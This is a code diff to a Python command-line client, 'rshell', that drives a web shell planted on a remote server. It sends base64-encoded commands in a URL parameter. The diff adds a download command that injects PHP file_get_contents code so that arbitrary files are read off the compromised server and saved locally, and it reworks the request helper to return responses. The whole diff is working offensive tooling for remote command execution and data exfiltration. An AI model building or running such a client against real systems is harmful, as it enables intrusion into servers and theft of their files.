@@ -32,7 +32,9 @@ class rshell(Cmd):
         #the [:-1] is because encodestring add a \n at the end
         url += quote_plus(base64.encodestring(s)[:-1])
         #doing the request to the server
-        self.dorequest(url)
+        (code, response) = self.dorequest(url)
+        if code == 200:
+            print response
 
     def do_quit(self, line):
         exit(0)
@@ -55,11 +57,13 @@ class rshell(Cmd):
             con.request('GET', url)
             response = con.getresponse()
             if response.status == 200:
-                print response.read()
+                return (response.status, response.read())
             else:
-                print response.status
+                #
+                return (response.status, None)
         else:
-            print "Can't connect"
+            #
+            return (None, None)
 
     def do_shell(self, line):
         #This method execute the command locally
@@ -85,4 +89,11 @@ class rshell(Cmd):
 
     def do_download(self, line):
         files = line.split()
-        
+        fullurl = self.shell_url + '?param='
+        fullurl += quote_plus(base64.encodestring("echo base64_encode(file_get_contents('{0}'));".format(files[0]))[:-1])
+        (code, data) = self.dorequest(fullurl)
+        if code == 200:
+            f = file(os.path.basename(files[0]), "w")
+            f.write(base64.decodestring(data))
+        else:
+            print "Error"
